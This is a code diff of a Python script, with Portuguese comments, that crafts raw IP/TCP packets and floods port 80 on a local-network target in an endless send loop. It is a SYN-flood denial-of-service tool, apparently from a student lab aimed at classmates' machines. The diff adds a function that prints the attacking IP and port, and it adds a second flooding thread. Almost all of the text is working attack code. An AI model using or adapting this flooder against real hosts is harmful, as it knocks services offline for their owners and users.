@@ -24,6 +24,13 @@ def checksum(msg):
      
     return s
 
+def show_who(ip,porta):
+
+    print 'O servidor esta sendo atacado pelo ip ',ip,'na porta',porta
+
+
+
+
 def attack(porta): 
     #create a raw socket
     try:
@@ -44,10 +51,11 @@ def attack(porta):
     #para evitar que sejam todos 255 ou tenha 0.0.0.0
     #source_ip = '.'.join('%s'%random.randint(2, 254) for i in range(4)) 
     source_ip = '192.168.0.18'
-    print 'IP aleatorio gerado: ', source_ip
     #dest_ip = '192.168.0.101' # victor
     dest_ip = '192.168.0.1' # gabriel
-     
+    
+    show_who(source_ip,porta)
+
     # ip header fields
     ihl = 5
     version = 4
@@ -67,9 +75,7 @@ def attack(porta):
     ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
      
     # tcp header fields
-    #source = random.randint(4000, 9000) # gera portas de origem aleatorias, entre os intervalos 4000 e 9000
     source = porta
-    print 'Porta aleatoria gerada: ', source
     dest = 80   # destination port
     seq = 0
     ack_seq = 0
@@ -110,12 +116,18 @@ def attack(porta):
     packet = ip_header + tcp_header
      
     #Send the packet finally - the port specified has no effect
-    print 'O servidor',dest_ip,'esta sendo atacado'
-     
+         
     #put the above line in a loop like while 1: if you want to flood
     while True:
         s.sendto(packet, (dest_ip , 0 ))    # put this in a loop if you want to flood the target
 
-ataque1 = Thread(target=attack,args=[5000])
 
+
+
+ataque1 = Thread(target=attack,args=[5000])
+ataque2 = Thread(target=attack,args=[5001])
+
+
+
+ataque2.start()
 ataque1.start()
